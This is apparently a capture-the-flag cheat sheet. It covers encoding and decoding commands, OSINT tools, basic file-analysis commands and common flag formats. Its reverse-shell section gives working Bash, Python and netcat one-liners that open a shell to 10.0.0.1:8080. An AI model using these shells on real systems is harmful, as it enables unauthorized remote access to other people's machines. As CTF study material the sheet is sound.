# Miscellaneous Cheatsheet

## 1. Encoding

| Encoding | Example | Decode |
|----------|---------|--------|
| Base64 | SGVsbG8= | base64 -d |
| Base32 | JBSWY3DP | base32 -d |
| Hex | 48656c6c6f | xxd -r -p |
| Binary | 01001000 | perl -lpe '$_=pack("B*",$_)' |
| URL | %48%65 | python3 -c "import urllib.parse; print(urllib.parse.unquote('...'))" |
| ROT13 | Uryyb | tr 'A-Za-z' 'N-ZA-Mn-za-m' |

## 2. OSINT

### Search Engines
- Google Dorks
- Bing
- Yandex

### Social Media
- Twitter/X
- LinkedIn
- Facebook
- Instagram

### Tools
- theHarvester
- Sherlock
- whois
- Shodan

## 3. File Analysis

    file suspicious_file
    strings suspicious_file | grep -i flag
    xxd suspicious_file | head

## 4. Reverse Shells

### Bash

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

### Python

    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

### Netcat

    nc -e /bin/sh 10.0.0.1 8080

## 5. Common Flags

    flag{...}
    CTF{...}
    HACK4GOV{...}
    picoCTF{...}

## Critical Tips

1. Check metadata first
2. Try CyberChef magic mode
3. Look for hidden files
4. Check timestamps
5. Use exiftool on everything
